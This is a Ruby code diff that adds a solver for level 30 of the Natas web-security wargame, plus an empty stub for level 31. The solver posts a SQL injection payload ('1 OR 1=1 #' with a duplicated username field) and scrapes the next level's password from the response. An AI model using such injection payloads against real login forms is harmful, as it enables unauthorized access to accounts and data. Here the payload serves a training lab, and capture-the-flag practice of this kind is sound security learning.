@@ -857,4 +857,26 @@ end
 # Level 30
 class NatasLevel30 < NatasLevelBase
   LEVEL = 30
+  PAGE = '/'
+  PAYLOAD = [
+    ['username', '1 OR 1=1 #'],
+    ['username', 2],
+    ['password', 'x']
+  ]
+
+  def exec
+    data = post(
+      PAGE,
+      {},
+      PAYLOAD
+    ).body
+    match = %r(<br>natas31(\w{32})<div).match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+# Level 31
+class NatasLevel31 < NatasLevelBase
+  LEVEL = 31
 end
